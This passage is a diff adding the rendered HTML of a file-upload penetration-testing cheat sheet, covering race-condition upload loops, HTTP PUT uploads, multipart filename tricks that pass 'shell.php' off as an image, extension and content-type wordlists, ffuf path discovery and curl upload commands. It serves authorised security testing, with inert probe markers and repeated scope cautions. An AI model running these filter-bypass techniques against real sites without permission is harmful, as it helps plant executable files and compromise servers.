+</span><span id="__span-86-3"><a id="__codelineno-86-3" name="__codelineno-86-3" href="#__codelineno-86-3"></a>https://attacker.example/longname.php.jpg
+</span></code></pre></div>
+<hr />
+<h2 id="race-conditions">Race Conditions</h2>
+<p>Some upload flows validate or scan after writing the file.</p>
+<p>Flow:</p>
+<ol>
+<li>Upload candidate file.</li>
+<li>Immediately request the saved URL repeatedly.</li>
+<li>Check whether the file is briefly accessible before deletion/quarantine.</li>
+<li>Use short, controlled tests only.</li>
+</ol>
+<p>Race request loop:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a><span class="k">while</span><span class="w"> </span>true<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-87-2"><a id="__codelineno-87-2" name="__codelineno-87-2" href="#__codelineno-87-2"></a><span class="w">  </span>curl<span class="w"> </span>-sk<span class="w"> </span><span class="s2">&quot;https://target/uploads/probe.php&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>upload_probe_73921<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="k">break</span>
+</span><span id="__span-87-3"><a id="__codelineno-87-3" name="__codelineno-87-3" href="#__codelineno-87-3"></a><span class="k">done</span>
+</span></code></pre></div>
+<p>Upload loop:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a><span class="k">while</span><span class="w"> </span>true<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2" href="#__codelineno-88-2"></a><span class="w">  </span>curl<span class="w"> </span>-sk<span class="w"> </span>-F<span class="w"> </span><span class="s2">&quot;file=@probe.php;type=image/png&quot;</span><span class="w"> </span><span class="s2">&quot;https://target/upload&quot;</span><span class="w"> </span>&gt;/dev/null
+</span><span id="__span-88-3"><a id="__codelineno-88-3" name="__codelineno-88-3" href="#__codelineno-88-3"></a><span class="k">done</span>
+</span></code></pre></div>
+<p>Stop immediately after proof. Avoid high concurrency unless explicitly authorized.</p>
+<hr />
+<h2 id="put-upload-testing">PUT Upload Testing</h2>
+<p>Some servers allow direct upload through HTTP PUT.</p>
+<p>Check OPTIONS:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a>curl<span class="w"> </span>-i<span class="w"> </span>-X<span class="w"> </span>OPTIONS<span class="w"> </span>https://target/uploads/
+</span></code></pre></div>
+<p>Try harmless upload:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a>curl<span class="w"> </span>-i<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span>https://target/uploads/probe.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-90-2"><a id="__codelineno-90-2" name="__codelineno-90-2" href="#__codelineno-90-2"></a><span class="w">  </span>--data-binary<span class="w"> </span><span class="s2">&quot;upload_probe_73921&quot;</span>
+</span></code></pre></div>
+<p>Verify:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a>curl<span class="w"> </span>-i<span class="w"> </span>https://target/uploads/probe.txt
+</span></code></pre></div>
+<p>Try extension behavior only if in scope:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>curl<span class="w"> </span>-i<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span>https://target/uploads/probe.html<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-92-2"><a id="__codelineno-92-2" name="__codelineno-92-2" href="#__codelineno-92-2"></a><span class="w">  </span>--data-binary<span class="w"> </span><span class="s1">&#39;&lt;h1&gt;upload_probe_73921&lt;/h1&gt;&#39;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="multipart-request-manipulation">Multipart Request Manipulation</h2>
+<h3 id="change-filename-only">Change Filename Only</h3>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a><span class="err">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;</span>
+</span><span id="__span-93-2"><a id="__codelineno-93-2" name="__codelineno-93-2" href="#__codelineno-93-2"></a><span class="err">Content-Type: image/png</span>
+</span></code></pre></div>
+<h3 id="change-field-name">Change Field Name</h3>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a><span class="err">Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;probe.png&quot;</span>
+</span></code></pre></div>
+<p>Try alternate field names:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a>file
+</span><span id="__span-95-2"><a id="__codelineno-95-2" name="__codelineno-95-2" href="#__codelineno-95-2"></a>files
+</span><span id="__span-95-3"><a id="__codelineno-95-3" name="__codelineno-95-3" href="#__codelineno-95-3"></a>upload
+</span><span id="__span-95-4"><a id="__codelineno-95-4" name="__codelineno-95-4" href="#__codelineno-95-4"></a>image
+</span><span id="__span-95-5"><a id="__codelineno-95-5" name="__codelineno-95-5" href="#__codelineno-95-5"></a>avatar
+</span><span id="__span-95-6"><a id="__codelineno-95-6" name="__codelineno-95-6" href="#__codelineno-95-6"></a>attachment
+</span><span id="__span-95-7"><a id="__codelineno-95-7" name="__codelineno-95-7" href="#__codelineno-95-7"></a>document
+</span><span id="__span-95-8"><a id="__codelineno-95-8" name="__codelineno-95-8" href="#__codelineno-95-8"></a>media
+</span></code></pre></div>
+<h3 id="duplicate-file-fields">Duplicate File Fields</h3>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a><span class="err">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;safe.jpg&quot;</span>
+</span><span id="__span-96-2"><a id="__codelineno-96-2" name="__codelineno-96-2" href="#__codelineno-96-2"></a>
+</span><span id="__span-96-3"><a id="__codelineno-96-3" name="__codelineno-96-3" href="#__codelineno-96-3"></a><span class="err">SAFE</span>
+</span><span id="__span-96-4"><a id="__codelineno-96-4" name="__codelineno-96-4" href="#__codelineno-96-4"></a>
+</span><span id="__span-96-5"><a id="__codelineno-96-5" name="__codelineno-96-5" href="#__codelineno-96-5"></a><span class="err">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;</span>
+</span><span id="__span-96-6"><a id="__codelineno-96-6" name="__codelineno-96-6" href="#__codelineno-96-6"></a>
+</span><span id="__span-96-7"><a id="__codelineno-96-7" name="__codelineno-96-7" href="#__codelineno-96-7"></a><span class="err">PAYLOAD</span>
+</span></code></pre></div>
+<h3 id="duplicate-filename-parameters">Duplicate Filename Parameters</h3>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a><span class="err">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;safe.jpg&quot;; filename=&quot;shell.php&quot;</span>
+</span></code></pre></div>
+<h3 id="utf-8-filename">UTF-8 Filename</h3>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a><span class="err">Content-Disposition: form-data; name=&quot;file&quot;; filename*=UTF-8&#39;&#39;shell.php</span>
+</span></code></pre></div>
+<p>Check parser differences between frontend proxy, framework, storage layer, and scanner.</p>
+<hr />
+<h2 id="client-side-impact-files">Client-Side Impact Files</h2>
+<p>Even without server-side execution, uploaded files can still be useful.</p>
+<h3 id="stored-xss">Stored XSS</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a>.html
+</span><span id="__span-99-2"><a id="__codelineno-99-2" name="__codelineno-99-2" href="#__codelineno-99-2"></a>.svg
+</span><span id="__span-99-3"><a id="__codelineno-99-3" name="__codelineno-99-3" href="#__codelineno-99-3"></a>.xhtml
+</span><span id="__span-99-4"><a id="__codelineno-99-4" name="__codelineno-99-4" href="#__codelineno-99-4"></a>.xml
+</span></code></pre></div>
+<h3 id="phishing-trusted-origin-abuse">Phishing / Trusted-Origin Abuse</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a>login.html
+</span><span id="__span-100-2"><a id="__codelineno-100-2" name="__codelineno-100-2" href="#__codelineno-100-2"></a>invoice.html
+</span><span id="__span-100-3"><a id="__codelineno-100-3" name="__codelineno-100-3" href="#__codelineno-100-3"></a>sso.html
+</span><span id="__span-100-4"><a id="__codelineno-100-4" name="__codelineno-100-4" href="#__codelineno-100-4"></a>support.html
+</span></code></pre></div>
+<h3 id="csv-injection">CSV Injection</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a>.csv
+</span><span id="__span-101-2"><a id="__codelineno-101-2" name="__codelineno-101-2" href="#__codelineno-101-2"></a>.xls
+</span><span id="__span-101-3"><a id="__codelineno-101-3" name="__codelineno-101-3" href="#__codelineno-101-3"></a>.xlsx
+</span></code></pre></div>
+<h3 id="open-redirect-html-smuggling">Open Redirect / HTML Smuggling</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a>.html
+</span><span id="__span-102-2"><a id="__codelineno-102-2" name="__codelineno-102-2" href="#__codelineno-102-2"></a>.svg
+</span><span id="__span-102-3"><a id="__codelineno-102-3" name="__codelineno-102-3" href="#__codelineno-102-3"></a>.js
+</span></code></pre></div>
+<h3 id="malware-social-engineering">Malware / Social Engineering</h3>
+<p>Only test this if explicitly allowed. Prefer inert proof files and markers.</p>
+<hr />
+<h2 id="parser-converter-targets">Parser / Converter Targets</h2>
+<p>Uploaded files may be processed by backend libraries.</p>
+<table>
+<thead>
+<tr>
+<th>Processor</th>
+<th>Interesting Tests</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ImageMagick</td>
+<td>image parser behavior, SSRF-like fetches, old ImageTragick-style cases</td>
+</tr>
+<tr>
+<td>Ghostscript</td>
+<td>PDF/PS processing behavior</td>
+</tr>
+<tr>
+<td>ExifTool</td>
+<td>metadata parser bugs</td>
+</tr>
+<tr>
+<td>LibreOffice</td>
+<td>DOCX/XLSX/PPTX conversion</td>
+</tr>
+<tr>
+<td>FFmpeg</td>
+<td>media parsing, HLS/playlist behavior</td>
+</tr>
+<tr>
+<td>PDF generators</td>
+<td>HTML-to-PDF, local file fetch, SSRF</td>
+</tr>
+<tr>
+<td>Antivirus/sandbox</td>
+<td>decompression, parser edge cases</td>
+</tr>
+<tr>
+<td>OCR engines</td>
+<td>image/PDF parsing</td>
+</tr>
+</tbody>
+</table>
+<p>Start with harmless callback/marker tests before any exploit-specific payload.</p>
+<hr />
+<h2 id="filename-collision-overwrite">Filename Collision / Overwrite</h2>
+<p>Test whether uploads overwrite existing files.</p>
+<p>Flow:</p>
+<ol>
+<li>Upload <code>probe.txt</code> with marker A.</li>
+<li>Upload <code>probe.txt</code> again with marker B.</li>
+<li>Fetch public URL.</li>
+<li>Check whether marker A or B is served.</li>
+</ol>
+<p>Commands:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;marker_A_73921&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>probe.txt
+</span><span id="__span-103-2"><a id="__codelineno-103-2" name="__codelineno-103-2" href="#__codelineno-103-2"></a>curl<span class="w"> </span>-sk<span class="w"> </span>-F<span class="w"> </span><span class="s2">&quot;file=@probe.txt&quot;</span><span class="w"> </span><span class="s2">&quot;https://target/upload&quot;</span>
+</span><span id="__span-103-3"><a id="__codelineno-103-3" name="__codelineno-103-3" href="#__codelineno-103-3"></a>
+</span><span id="__span-103-4"><a id="__codelineno-103-4" name="__codelineno-103-4" href="#__codelineno-103-4"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;marker_B_73921&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>probe.txt
+</span><span id="__span-103-5"><a id="__codelineno-103-5" name="__codelineno-103-5" href="#__codelineno-103-5"></a>curl<span class="w"> </span>-sk<span class="w"> </span>-F<span class="w"> </span><span class="s2">&quot;file=@probe.txt&quot;</span><span class="w"> </span><span class="s2">&quot;https://target/upload&quot;</span>
+</span></code></pre></div>
+<p>Check for:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a>overwrite
+</span><span id="__span-104-2"><a id="__codelineno-104-2" name="__codelineno-104-2" href="#__codelineno-104-2"></a>rename
+</span><span id="__span-104-3"><a id="__codelineno-104-3" name="__codelineno-104-3" href="#__codelineno-104-3"></a>deduplication
+</span><span id="__span-104-4"><a id="__codelineno-104-4" name="__codelineno-104-4" href="#__codelineno-104-4"></a>user-isolation failure
+</span><span id="__span-104-5"><a id="__codelineno-104-5" name="__codelineno-104-5" href="#__codelineno-104-5"></a>cross-tenant collision
+</span><span id="__span-104-6"><a id="__codelineno-104-6" name="__codelineno-104-6" href="#__codelineno-104-6"></a>predictable filename
+</span><span id="__span-104-7"><a id="__codelineno-104-7" name="__codelineno-104-7" href="#__codelineno-104-7"></a>predictable path
+</span></code></pre></div>
+<hr />
+<h2 id="file-size-resource-testing">File Size / Resource Testing</h2>
+<p>Use controlled sizes only.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a>dd<span class="w"> </span><span class="k">if</span><span class="o">=</span>/dev/zero<span class="w"> </span><span class="nv">of</span><span class="o">=</span>1mb.bin<span class="w"> </span><span class="nv">bs</span><span class="o">=</span>1M<span class="w"> </span><span class="nv">count</span><span class="o">=</span><span class="m">1</span>
+</span><span id="__span-105-2"><a id="__codelineno-105-2" name="__codelineno-105-2" href="#__codelineno-105-2"></a>dd<span class="w"> </span><span class="k">if</span><span class="o">=</span>/dev/zero<span class="w"> </span><span class="nv">of</span><span class="o">=</span>10mb.bin<span class="w"> </span><span class="nv">bs</span><span class="o">=</span>1M<span class="w"> </span><span class="nv">count</span><span class="o">=</span><span class="m">10</span>
+</span></code></pre></div>
+<p>Check:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a>maximum size
+</span><span id="__span-106-2"><a id="__codelineno-106-2" name="__codelineno-106-2" href="#__codelineno-106-2"></a>chunked upload behavior
+</span><span id="__span-106-3"><a id="__codelineno-106-3" name="__codelineno-106-3" href="#__codelineno-106-3"></a>resume behavior
+</span><span id="__span-106-4"><a id="__codelineno-106-4" name="__codelineno-106-4" href="#__codelineno-106-4"></a>partial file exposure
+</span><span id="__span-106-5"><a id="__codelineno-106-5" name="__codelineno-106-5" href="#__codelineno-106-5"></a>temporary file cleanup
+</span><span id="__span-106-6"><a id="__codelineno-106-6" name="__codelineno-106-6" href="#__codelineno-106-6"></a>async scanner behavior
+</span><span id="__span-106-7"><a id="__codelineno-106-7" name="__codelineno-106-7" href="#__codelineno-106-7"></a>disk quota behavior
+</span></code></pre></div>
+<p>Avoid destructive storage exhaustion.</p>
+<hr />
+<h2 id="burp-intruder-wordlists">Burp Intruder Wordlists</h2>
+<h3 id="extension-list">Extension List</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a>php
+</span><span id="__span-107-2"><a id="__codelineno-107-2" name="__codelineno-107-2" href="#__codelineno-107-2"></a>php3
+</span><span id="__span-107-3"><a id="__codelineno-107-3" name="__codelineno-107-3" href="#__codelineno-107-3"></a>php4
+</span><span id="__span-107-4"><a id="__codelineno-107-4" name="__codelineno-107-4" href="#__codelineno-107-4"></a>php5
+</span><span id="__span-107-5"><a id="__codelineno-107-5" name="__codelineno-107-5" href="#__codelineno-107-5"></a>phtml
+</span><span id="__span-107-6"><a id="__codelineno-107-6" name="__codelineno-107-6" href="#__codelineno-107-6"></a>pht
+</span><span id="__span-107-7"><a id="__codelineno-107-7" name="__codelineno-107-7" href="#__codelineno-107-7"></a>phar
+</span><span id="__span-107-8"><a id="__codelineno-107-8" name="__codelineno-107-8" href="#__codelineno-107-8"></a>asp
+</span><span id="__span-107-9"><a id="__codelineno-107-9" name="__codelineno-107-9" href="#__codelineno-107-9"></a>aspx
+</span><span id="__span-107-10"><a id="__codelineno-107-10" name="__codelineno-107-10" href="#__codelineno-107-10"></a>ashx
+</span><span id="__span-107-11"><a id="__codelineno-107-11" name="__codelineno-107-11" href="#__codelineno-107-11"></a>asmx
+</span><span id="__span-107-12"><a id="__codelineno-107-12" name="__codelineno-107-12" href="#__codelineno-107-12"></a>jsp
+</span><span id="__span-107-13"><a id="__codelineno-107-13" name="__codelineno-107-13" href="#__codelineno-107-13"></a>jspx
+</span><span id="__span-107-14"><a id="__codelineno-107-14" name="__codelineno-107-14" href="#__codelineno-107-14"></a>war
+</span><span id="__span-107-15"><a id="__codelineno-107-15" name="__codelineno-107-15" href="#__codelineno-107-15"></a>html
+</span><span id="__span-107-16"><a id="__codelineno-107-16" name="__codelineno-107-16" href="#__codelineno-107-16"></a>htm
+</span><span id="__span-107-17"><a id="__codelineno-107-17" name="__codelineno-107-17" href="#__codelineno-107-17"></a>svg
+</span><span id="__span-107-18"><a id="__codelineno-107-18" name="__codelineno-107-18" href="#__codelineno-107-18"></a>xml
+</span><span id="__span-107-19"><a id="__codelineno-107-19" name="__codelineno-107-19" href="#__codelineno-107-19"></a>pdf
+</span><span id="__span-107-20"><a id="__codelineno-107-20" name="__codelineno-107-20" href="#__codelineno-107-20"></a>zip
+</span></code></pre></div>
+<h3 id="content-type-list">Content-Type List</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a>image/png
+</span><span id="__span-108-2"><a id="__codelineno-108-2" name="__codelineno-108-2" href="#__codelineno-108-2"></a>image/jpeg
+</span><span id="__span-108-3"><a id="__codelineno-108-3" name="__codelineno-108-3" href="#__codelineno-108-3"></a>image/gif
+</span><span id="__span-108-4"><a id="__codelineno-108-4" name="__codelineno-108-4" href="#__codelineno-108-4"></a>text/plain
+</span><span id="__span-108-5"><a id="__codelineno-108-5" name="__codelineno-108-5" href="#__codelineno-108-5"></a>text/html
+</span><span id="__span-108-6"><a id="__codelineno-108-6" name="__codelineno-108-6" href="#__codelineno-108-6"></a>application/pdf
+</span><span id="__span-108-7"><a id="__codelineno-108-7" name="__codelineno-108-7" href="#__codelineno-108-7"></a>application/octet-stream
+</span><span id="__span-108-8"><a id="__codelineno-108-8" name="__codelineno-108-8" href="#__codelineno-108-8"></a>application/x-php
+</span><span id="__span-108-9"><a id="__codelineno-108-9" name="__codelineno-108-9" href="#__codelineno-108-9"></a>application/xml
+</span><span id="__span-108-10"><a id="__codelineno-108-10" name="__codelineno-108-10" href="#__codelineno-108-10"></a>image/svg+xml
+</span></code></pre></div>
+<h3 id="filename-mutation-pattern">Filename Mutation Pattern</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-109-1"><a id="__codelineno-109-1" name="__codelineno-109-1" href="#__codelineno-109-1"></a>probe§EXT§
+</span></code></pre></div>
+<p>or:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-110-1"><a id="__codelineno-110-1" name="__codelineno-110-1" href="#__codelineno-110-1"></a>probe.§EXT§.jpg
+</span></code></pre></div>
+<hr />
+<h2 id="ffuf-testing">ffuf Testing</h2>
+<h3 id="discover-upload-endpoints">Discover Upload Endpoints</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-111-1"><a id="__codelineno-111-1" name="__codelineno-111-1" href="#__codelineno-111-1"></a>ffuf<span class="w"> </span>-u<span class="w"> </span>https://target/FUZZ<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-111-2"><a id="__codelineno-111-2" name="__codelineno-111-2" href="#__codelineno-111-2"></a><span class="w">  </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/common.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-111-3"><a id="__codelineno-111-3" name="__codelineno-111-3" href="#__codelineno-111-3"></a><span class="w">  </span>-mc<span class="w"> </span>all
+</span></code></pre></div>
+<h3 id="common-upload-paths">Common Upload Paths</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-112-1"><a id="__codelineno-112-1" name="__codelineno-112-1" href="#__codelineno-112-1"></a>ffuf<span class="w"> </span>-u<span class="w"> </span>https://target/FUZZ<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-112-2"><a id="__codelineno-112-2" name="__codelineno-112-2" href="#__codelineno-112-2"></a><span class="w">  </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-112-3"><a id="__codelineno-112-3" name="__codelineno-112-3" href="#__codelineno-112-3"></a><span class="w">  </span>-mc<span class="w"> </span>all
+</span></code></pre></div>
+<p>Interesting words:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-113-1"><a id="__codelineno-113-1" name="__codelineno-113-1" href="#__codelineno-113-1"></a>upload
+</span><span id="__span-113-2"><a id="__codelineno-113-2" name="__codelineno-113-2" href="#__codelineno-113-2"></a>uploads
+</span><span id="__span-113-3"><a id="__codelineno-113-3" name="__codelineno-113-3" href="#__codelineno-113-3"></a>files
+</span><span id="__span-113-4"><a id="__codelineno-113-4" name="__codelineno-113-4" href="#__codelineno-113-4"></a>media
+</span><span id="__span-113-5"><a id="__codelineno-113-5" name="__codelineno-113-5" href="#__codelineno-113-5"></a>assets
+</span><span id="__span-113-6"><a id="__codelineno-113-6" name="__codelineno-113-6" href="#__codelineno-113-6"></a>attachments
+</span><span id="__span-113-7"><a id="__codelineno-113-7" name="__codelineno-113-7" href="#__codelineno-113-7"></a>avatar
+</span><span id="__span-113-8"><a id="__codelineno-113-8" name="__codelineno-113-8" href="#__codelineno-113-8"></a>profile
+</span><span id="__span-113-9"><a id="__codelineno-113-9" name="__codelineno-113-9" href="#__codelineno-113-9"></a>import
+</span><span id="__span-113-10"><a id="__codelineno-113-10" name="__codelineno-113-10" href="#__codelineno-113-10"></a>backup
+</span><span id="__span-113-11"><a id="__codelineno-113-11" name="__codelineno-113-11" href="#__codelineno-113-11"></a>admin/upload
+</span><span id="__span-113-12"><a id="__codelineno-113-12" name="__codelineno-113-12" href="#__codelineno-113-12"></a>api/upload
+</span></code></pre></div>
+<h3 id="find-uploaded-file-path">Find Uploaded File Path</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-114-1"><a id="__codelineno-114-1" name="__codelineno-114-1" href="#__codelineno-114-1"></a>ffuf<span class="w"> </span>-u<span class="w"> </span>https://target/uploads/FUZZ<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-114-2"><a id="__codelineno-114-2" name="__codelineno-114-2" href="#__codelineno-114-2"></a><span class="w">  </span>-w<span class="w"> </span>filenames.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-114-3"><a id="__codelineno-114-3" name="__codelineno-114-3" href="#__codelineno-114-3"></a><span class="w">  </span>-mc<span class="w"> </span>all
+</span></code></pre></div>
+<hr />
+<h2 id="curl-upload-examples">curl Upload Examples</h2>
+<h3 id="basic-multipart-upload">Basic Multipart Upload</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-115-1"><a id="__codelineno-115-1" name="__codelineno-115-1" href="#__codelineno-115-1"></a>curl<span class="w"> </span>-i<span class="w"> </span>-k<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-115-2"><a id="__codelineno-115-2" name="__codelineno-115-2" href="#__codelineno-115-2"></a><span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;file=@probe.txt&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-115-3"><a id="__codelineno-115-3" name="__codelineno-115-3" href="#__codelineno-115-3"></a><span class="w">  </span>https://target/upload
+</span></code></pre></div>
+<h3 id="force-mime-type">Force MIME Type</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-116-1"><a id="__codelineno-116-1" name="__codelineno-116-1" href="#__codelineno-116-1"></a>curl<span class="w"> </span>-i<span class="w"> </span>-k<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-116-2"><a id="__codelineno-116-2" name="__codelineno-116-2" href="#__codelineno-116-2"></a><span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;file=@probe.php;type=image/png&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-116-3"><a id="__codelineno-116-3" name="__codelineno-116-3" href="#__codelineno-116-3"></a><span class="w">  </span>https://target/upload
+</span></code></pre></div>
+<h3 id="custom-filename">Custom Filename</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-117-1"><a id="__codelineno-117-1" name="__codelineno-117-1" href="#__codelineno-117-1"></a>curl<span class="w"> </span>-i<span class="w"> </span>-k<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-117-2"><a id="__codelineno-117-2" name="__codelineno-117-2" href="#__codelineno-117-2"></a><span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;file=@probe.txt;filename=shell.php&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-117-3"><a id="__codelineno-117-3" name="__codelineno-117-3" href="#__codelineno-117-3"></a><span class="w">  </span>https://target/upload
+</span></code></pre></div>
+<h3 id="add-cookie">Add Cookie</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-118-1"><a id="__codelineno-118-1" name="__codelineno-118-1" href="#__codelineno-118-1"></a>curl<span class="w"> </span>-i<span class="w"> </span>-k<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-118-2"><a id="__codelineno-118-2" name="__codelineno-118-2" href="#__codelineno-118-2"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Cookie: session=SESSION_HERE&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-118-3"><a id="__codelineno-118-3" name="__codelineno-118-3" href="#__codelineno-118-3"></a><span class="w">  </span>-F<span class="w"> </span><span class="s2">&quot;file=@probe.txt;filename=probe.jpg;type=image/jpeg&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-118-4"><a id="__codelineno-118-4" name="__codelineno-118-4" href="#__codelineno-118-4"></a><span class="w">  </span>https://target/upload
+</span></code></pre></div>
+<h3 id="json-base64-upload">JSON / Base64 Upload</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-119-1"><a id="__codelineno-119-1" name="__codelineno-119-1" href="#__codelineno-119-1"></a>base64<span class="w"> </span>-w0<span class="w"> </span>probe.txt
+</span></code></pre></div>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-120-1"><a id="__codelineno-120-1" name="__codelineno-120-1" href="#__codelineno-120-1"></a>curl<span class="w"> </span>-i<span class="w"> </span>-k<span class="w"> </span>https://target/api/upload<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-120-2"><a id="__codelineno-120-2" name="__codelineno-120-2" href="#__codelineno-120-2"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Content-Type: application/json&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-120-3"><a id="__codelineno-120-3" name="__codelineno-120-3" href="#__codelineno-120-3"></a><span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;filename&quot;:&quot;probe.txt&quot;,&quot;content&quot;:&quot;BASE64_HERE&quot;}&#39;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="fuxploider">Fuxploider</h2>
+<p>Basic usage pattern:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-121-1"><a id="__codelineno-121-1" name="__codelineno-121-1" href="#__codelineno-121-1"></a>fuxploider<span class="w"> </span>--url<span class="w"> </span>https://target/upload<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-121-2"><a id="__codelineno-121-2" name="__codelineno-121-2" href="#__codelineno-121-2"></a><span class="w">  </span>--not-regex<span class="w"> </span><span class="s2">&quot;error|invalid|not allowed&quot;</span>
+</span></code></pre></div>
+<p>Use with caution:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-122-1"><a id="__codelineno-122-1" name="__codelineno-122-1" href="#__codelineno-122-1"></a>scanner results need manual verification
+</span><span id="__span-122-2"><a id="__codelineno-122-2" name="__codelineno-122-2" href="#__codelineno-122-2"></a>uploaded payloads may leave files behind
+</span><span id="__span-122-3"><a id="__codelineno-122-3" name="__codelineno-122-3" href="#__codelineno-122-3"></a>authenticated flows usually need captured requests/cookies
+</span><span id="__span-122-4"><a id="__codelineno-122-4" name="__codelineno-122-4" href="#__codelineno-122-4"></a>production testing needs strict scope control
+</span></code></pre></div>
+<hr />
